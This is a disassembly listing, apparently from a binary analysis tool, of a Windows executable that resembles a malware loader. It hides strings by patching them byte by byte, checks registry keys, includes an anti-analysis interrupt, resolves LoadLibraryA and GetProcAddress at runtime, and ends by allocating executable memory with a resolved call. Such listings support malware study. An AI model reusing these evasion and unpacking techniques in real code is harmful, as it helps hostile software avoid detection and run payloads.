0x00401450:	pushl	%ebp	; from: 0x00401d09(MAY)
0x00401451:	movl	%esp, %ebp
0x00401453:	movl	0xc(%ebp), %eax
0x00401456:	pushl	%eax
0x00401457:	movl	0x8(%ebp), %ecx
0x0040145a:	pushl	%ecx
0x0040145b:	call	0x0042b240	; targets: 0xff000040(MAY)
0x00401461:	popl	%ebp
0x00401462:	ret	; targets: 0x00401d0e(MAY)


start:
0x00401630:	pushl	%ebp
0x00401631:	movl	%esp, %ebp
0x00401633:	subl	$0x88, %esp
0x00401639:	movl	$0x0, -20(%ebp)
0x00401640:	movl	$0x64, -132(%ebp)
0x0040164a:	movl	$0x1, -24(%ebp)
0x00401651:	movl	$0x0, -4(%ebp)
0x00401658:	movl	$0x0, -44(%ebp)
0x0040165f:	movl	$0xffff, -136(%ebp)
0x00401669:	movl	$0x42b140, -100(%ebp)
0x00401670:	movl	$0x42b150, -32(%ebp)
0x00401677:	movl	$0x2d, -12(%ebp)
0x0040167e:	movl	$0x21, -8(%ebp)
0x00401685:	movl	$0x2d, -56(%ebp)
0x0040168c:	movl	0x8(%ebp), %ecx
0x0040168f:	movl	%ecx, 0x0042b24c
0x00401695:	movl	$0x0, 0x0042b278
0x0040169f:	movl	$0xffffffff, 0x0042b264
0x004016a9:	movl	0x0042b24c, %eax
0x004016ae:	andl	-136(%ebp), %eax
0x004016b4:	je	0x004016c2	; targets: 0x004016c2(MAY)
0x004016c2:	movl	$0x1, 0x0042b254	; from: 0x004016b4(MAY)
0x004016cc:	cmpl	$0x0, 0x0042b24c
0x004016d3:	jne	0x004016df	; targets: 0x004016d5(MAY)
0x004016d5:	movl	$0x0, 0x0042b254	; from: 0x004016d3(MAY)
0x004016df:	movl	-56(%ebp), %ecx
0x004016e2:	pushl	%ecx
0x004016e3:	movl	-8(%ebp), %edx
0x004016e6:	pushl	%edx
0x004016e7:	leal	-12(%ebp), %eax
0x004016ea:	pushl	%eax
0x004016eb:	call	InterlockedCompareExchange@kernel32.dll	; targets: 0xff0000f0(MAY)
0x004016f1:	movl	-100(%ebp), %ecx
0x004016f4:	movb	$0x61, (%ecx)
0x004016f7:	movl	-100(%ebp), %edx
0x004016fa:	movb	$0x69, 0x5(%edx)
0x004016fe:	movl	-32(%ebp), %eax
0x00401701:	movb	$0x6e, 0x6(%eax)
0x00401705:	movl	$0x404005, 0x0042b264
0x0040170f:	movl	RegOpenKeyW@advapi32.dll, %ecx
0x00401715:	movl	%ecx, 0x0042b268
0x0040171b:	movl	$0x53, %edx
0x00401720:	movl	0x0042b13c, %eax
0x00401725:	movw	%dx, (%eax)
0x00401728:	leal	-16(%ebp), %ecx
0x0040172b:	pushl	%ecx
0x0040172c:	movl	0x0042b13c, %edx
0x00401732:	pushl	%edx
0x00401733:	pushl	$0x80000002
0x00401738:	call	RegOpenKeyW@advapi32.dll	; targets: 0xff000c40(MAY)
0x0040173e:	testl	%eax, %eax
0x00401740:	je	0x0040174e	; targets: 0x0040174e(MAY), 0x00401742(MAY)
0x00401742:	int	$0xffffff9c	; from: 0x00401740(MAY)
0x00401744:	movl	$0x2, %eax
0x00401749:	jmp	0x004019cb	; targets: 0x004019cb(MAY)
0x0040174e:	movl	GetProcAddress@kernel32.dll, %eax	; from: 0x00401740(MAY)
0x00401753:	movl	%eax, 0x0042b240
0x00401758:	movl	LoadLibraryA@kernel32.dll, %ecx
0x0040175e:	movl	%ecx, 0x0042b234
0x00401764:	movl	-56(%ebp), %edx
0x00401767:	pushl	%edx
0x00401768:	movl	-8(%ebp), %eax
0x0040176b:	pushl	%eax
0x0040176c:	leal	-12(%ebp), %ecx
0x0040176f:	pushl	%ecx
0x00401770:	call	InterlockedCompareExchange@kernel32.dll	; targets: 0xff0000f0(MAY)
0x00401776:	leal	-16(%ebp), %edx
0x00401779:	pushl	%edx
0x0040177a:	pushl	$0x42b15c
0x0040177f:	movl	-16(%ebp), %eax
0x00401782:	pushl	%eax
0x00401783:	call	0x0042b268	; targets: 0xff000c40(MAY)
0x00401789:	testl	%eax, %eax
0x0040178b:	je	0x00401797	; targets: 0x00401797(MAY), 0x0040178d(MAY)
0x0040178d:	movl	$0x1, 0x0042b234	; from: 0x0040178b(MAY)
0x00401797:	leal	-16(%ebp), %ecx	; from: 0x0040178b(MAY)
0x0040179a:	pushl	%ecx
0x0040179b:	pushl	$0x42b168
0x004017a0:	movl	-16(%ebp), %edx
0x004017a3:	pushl	%edx
0x004017a4:	call	0x0042b268	; targets: 0xff000c40(MAY)
0x004017aa:	testl	%eax, %eax
0x004017ac:	je	0x004017b8	; targets: 0x004017b8(MAY), 0x004017ae(MAY)
0x004017ae:	movl	$0x1, 0x0042b234	; from: 0x004017ac(MAY)
0x004017b8:	cmpl	$0x0, 0x0042b254	; from: 0x004017ac(MAY)
0x004017bf:	jne	0x004017cb	; targets: 0x004017c1(MAY)
0x004017c1:	movl	$0x400000, 0x0042b24c	; from: 0x004017bf(MAY)
0x004017cb:	movl	0x0042b24c, %eax
0x004017d0:	movl	%eax, -40(%ebp)
0x004017d3:	movl	0x0042b24c, %ecx
0x004017d9:	movl	-40(%ebp), %edx
0x004017dc:	addl	0x3c(%ecx), %edx
0x004017df:	movl	%edx, -40(%ebp)
0x004017e2:	movl	-40(%ebp), %eax
0x004017e5:	movl	%eax, 0x0042b230
0x004017ea:	movl	0x0042b100, %ecx
0x004017f0:	movb	$0x65, 0x1(%ecx)
0x004017f4:	movl	0x0042b100, %edx
0x004017fa:	movb	$0x65, 0x4(%edx)
0x004017fe:	movl	$0x404005, 0x0042b264
0x00401808:	movl	0x0042b100, %eax
0x0040180d:	pushl	%eax
0x0040180e:	call	0x0042b234	; targets: 0xff0000a0(MAY), 0x00000001(MAY)
0x00401814:	movl	%eax, 0x0042b258
0x00401819:	movl	0x0042b264, %ecx
0x0040181f:	pushl	%ecx
0x00401820:	call	0x00401cc0	; targets: 0x00401cc0(MAY)
0x00401825:	addl	$0x4, %esp	; from: 0x00401cca(MAY)
0x00401828:	movl	%eax, -28(%ebp)
0x0040182b:	movl	-28(%ebp), %edx
0x0040182e:	pushl	%edx
0x0040182f:	call	0x00401cf0	; targets: 0x00401cf0(MAY)
0x004019cb:	movl	%ebp, %esp	; from: 0x00401749(MAY)
0x004019cd:	popl	%ebp
0x004019ce:	ret	; targets: 0xfee70000(MAY)

0x00401cc0:	pushl	%ebp	; from: 0x00401820(MAY)
0x00401cc1:	movl	%esp, %ebp
0x00401cc3:	movl	0x8(%ebp), %eax
0x00401cc6:	movl	-4(%eax), %eax
0x00401cc9:	popl	%ebp
0x00401cca:	ret	; targets: 0x00401825(MAY)

0x00401cf0:	pushl	%ebp	; from: 0x0040182f(MAY)
0x00401cf1:	movl	%esp, %ebp
0x00401cf3:	pushl	%ecx
0x00401cf4:	movl	0x0042b098, %eax
0x00401cf9:	movb	$0x65, 0x1(%eax)
0x00401cfd:	pushl	$0x42b208
0x00401d02:	movl	0x0042b258, %ecx
0x00401d08:	pushl	%ecx
0x00401d09:	call	0x00401450	; targets: 0x00401450(MAY)
0x00401d0e:	addl	$0x8, %esp	; from: 0x00401462(MAY)
0x00401d11:	movl	%eax, -4(%ebp)
0x00401d14:	pushl	$0x40
0x00401d16:	pushl	$0x3000
0x00401d1b:	movl	0x8(%ebp), %edx
0x00401d1e:	pushl	%edx
0x00401d1f:	pushl	$0x0
0x00401d21:	call	-4(%ebp)	; targets: unresolved
